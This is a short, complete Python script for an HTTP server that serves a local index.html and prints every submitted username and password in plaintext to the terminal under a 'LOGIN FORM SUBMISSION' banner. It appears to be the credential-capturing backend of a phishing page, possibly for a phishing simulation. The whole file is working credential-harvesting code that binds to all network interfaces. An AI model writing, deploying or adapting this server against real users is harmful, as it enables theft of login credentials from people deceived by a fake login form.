#!/usr/bin/env python3
"""Simple HTTP server that serves static files and logs form submissions."""

import http.server
import json
import os
import sys
import urllib.parse

PORT = 8080
DIR = os.path.dirname(os.path.abspath(__file__))


class LoggingHandler(http.server.SimpleHTTPRequestHandler):

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)
        try:
            data = json.loads(body)
            print("\n" + "=" * 50, flush=True)
            print("  LOGIN FORM SUBMISSION", flush=True)
            print("=" * 50, flush=True)
            print(f"  Username/Email: {data.get('username', '')}", flush=True)
            print(f"  Password:       {data.get('password', '')}", flush=True)
            print("=" * 50 + "\n", flush=True)
        except Exception as e:
            print(f"[!] Failed to parse form data: {e}", flush=True)
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"status":"ok"}')

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path == "/":
            self.path = "/index.html"
        return super().do_GET()

    def translate_path(self, path):
        path = super().translate_path(path)
        # Serve files from the script's directory
        if path.startswith(DIR):
            return path
        # Fallback for any weird path resolution
        return os.path.join(DIR, os.path.basename(path))


if __name__ == "__main__":
    os.chdir(DIR)
    server = http.server.HTTPServer(("0.0.0.0", PORT), LoggingHandler)
    print(f"\n[*] Server running at http://localhost:{PORT}")
    print(f"[*] Open http://localhost:{PORT} in your browser")
    print(f"[*] Form submissions will appear here in the terminal\n")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        server.server_close()
